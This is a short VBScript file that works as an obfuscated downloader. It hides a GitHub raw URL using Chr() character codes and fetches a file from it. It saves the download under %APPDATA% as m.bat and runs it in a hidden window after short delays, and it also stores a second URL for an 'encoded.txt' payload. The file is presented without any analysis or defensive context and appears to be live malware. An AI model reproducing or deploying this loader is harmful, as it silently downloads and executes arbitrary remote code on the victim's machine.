Set a=CreateObject("WScript.Shell"):Set b=CreateObject("Scripting.FileSystemObject")
c=a.ExpandEnvironmentStrings("%APPDATA%")&Chr(92):d=c&"paged":e=c&"paged-l":f=e&Chr(92)&"m.txt":g=e&Chr(92)&"l.txt":j=e&Chr(92)&"m.bat"
If b.FolderExists(d) Then b.DeleteFolder d
If b.FolderExists(e) Then b.DeleteFolder e
b.CreateFolder d:b.CreateFolder e
b.CreateTextFile(g,1).Write "https://github.com/fatim759/done/raw/refs/heads/main/encoded.txt"
Set h=CreateObject("WinHttp.WinHttpRequest.5.1")
h.Open "GET",Chr(104)&Chr(116)&Chr(116)&Chr(112)&Chr(115)&Chr(58)&Chr(47)&Chr(47)&"raw.githubusercontent.com"&Chr(47)&"Zenth-grid"&Chr(47)&"ZENTH-MAIN"&Chr(47)&"heads"&Chr(47)&"main"&Chr(47)&"V"&Chr(47)&"Main.txt",0
h.Send
If h.Status=200 Then
Set i=CreateObject("ADODB.Stream"):i.Open:i.Type=1:i.Write h.ResponseBody:i.SaveToFile f,2:i.Close
WScript.Sleep 3000
b.MoveFile f,j
WScript.Sleep 4000
a.Run j,0
End If